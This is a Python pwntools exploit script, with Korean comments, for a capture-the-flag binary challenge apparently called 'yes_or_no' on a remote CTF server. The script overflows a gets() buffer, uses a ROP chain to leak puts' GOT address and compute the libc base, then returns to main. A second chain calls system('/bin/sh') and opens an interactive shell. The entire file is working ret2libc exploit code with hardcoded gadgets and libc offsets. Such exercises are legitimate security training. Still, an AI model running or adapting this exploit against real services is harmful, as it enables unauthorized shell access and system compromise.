from pwn import *

'''
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
'''

context(arch="amd64", os='linux')
libc = ELF('./libc-2.27.so')
r = remote("ctf.j0n9hyun.xyz", 3009)
#r = process("./yes_or_no")

# 조건에 맞게 숫자를 맞춰주면 gets 함수로 입력가능
number = b"9830400"
ret = p64(0x40056e)
dummy = b"A"*0x12+ret*4
pop_rdi = p64(0x400883)
puts = p64(0x400580)
puts_got = p64(0x601018)
main = p64(0x4005e0)

print(r.recv())
r.sendline(number)

# 제일 먼저 libc base를 얻기 위해 puts 함수를 이용해 puts의 got leak
# 이후 shell을 따기 위해 다시 main함수로 돌아가 gets함수를 이용
payload  = dummy
payload += pop_rdi
payload += puts_got
payload += puts
payload += main
print(r.recv())
print(r.recv())
r.sendline(payload)

# puts의 주소를 이용해 base를 구한 뒤, 문제에서 주어진 libc를 이용해
# system 함수와 binsh주소를 구함
# gdb-peda libc
# $ print system
# strings libc | grep /bin/sh
recv = r.recvline()
print("recv : ", recv)
puts_addr = u64((recv.strip()+b"\x00\x00\x00\x00\x00\x00\x00")[0:8])
print("puts : ", hex(puts_addr))
base = puts_addr - 0x809c0
system = p64(base + 0x4f440)
binsh = p64(base + 0x1b3e9a)

# exploit
# 딱 맞게 ret에 pop_rdi부터 넣으니 exploit이 잘 안되어
# ret를 더 넣어주었음
print(r.recv())
r.sendline(number)
print(r.recv())
payload  = dummy
payload += pop_rdi
payload += binsh
payload += system
r.sendline(payload)

r.interactive()

